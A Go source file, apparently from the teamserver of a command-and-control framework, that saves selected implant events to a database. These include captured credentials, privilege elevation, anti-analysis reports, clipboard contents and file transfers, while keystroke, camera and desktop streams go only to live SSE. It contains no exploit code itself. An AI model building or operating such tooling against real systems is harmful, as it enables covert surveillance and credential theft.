// Package eventlog 事件落盘消费者。
//
// 订阅全局事件总线, 按分级策略把「结果型事件」写入 store.events 表:
//   - 落盘: 会话上下线 / 凭据 / 对抗报告 / 提权 / 发现 / 文件传输结果 / Agent 日志 / 剪贴板 / 文件变更
//   - 不落: 流型事件(桌面帧/摄像头/音频/键击/心跳/终端输出/下载数据块), 仅走 SSE 实时,
//     量大且敏感, 落盘无回溯价值。
//
// 落盘失败不阻塞事件总线: AppendEvent 内部已吞错(审计模式), 保证 SSE 实时流不受影响。
package eventlog

import (
	"encoding/json"
	"time"

	"cleat/teamserver/internal/eventbus"
	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/store"
)

// persistedTypes 结果型事件白名单。
var persistedTypes = map[string]bool{
	eventbus.EventSessionOnline:    true,
	eventbus.EventSessionOffline:   true,
	eventbus.EventCredential:       true,
	eventbus.EventAntiAnalysis:     true,
	eventbus.EventElevation:        true,
	eventbus.EventDiscovery:        true,
	eventbus.EventFileDownloadDone: true,
	eventbus.EventFileDownloadErr:  true,
	eventbus.EventFileUploadDone:   true,
	eventbus.EventFileUploadErr:    true,
	eventbus.EventLog:              true,
	eventbus.EventClipboard:        true,
	eventbus.EventFileChange:       true,
}

// Start 启动事件落盘消费者(阻塞直到 quit 关闭)。
func Start(st *store.Store, bus *eventbus.Hub, quit <-chan struct{}) {
	defer logx.Guard("eventlog-consumer") // G3: 落盘消费者 panic 不许带崩进程
	ch := bus.SubscribeGlobal()
	defer bus.Unsubscribe(0, ch)
	for {
		select {
		case ev := <-ch:
			if !persistedTypes[ev.Type] {
				continue
			}
			rec := store.EventRecord{
				Seq:       ev.Seq,
				Type:      ev.Type,
				SessionID: ev.SessionID,
			}
			if ev.TS > 0 {
				rec.TS = ev.TS
			} else {
				rec.TS = time.Now().UnixMilli()
			}
			if ev.Data != nil {
				if b, err := json.Marshal(ev.Data); err == nil {
					rec.Data = string(b)
				}
			}
			st.AppendEvent(rec)
		case <-quit:
			return
		}
	}
}
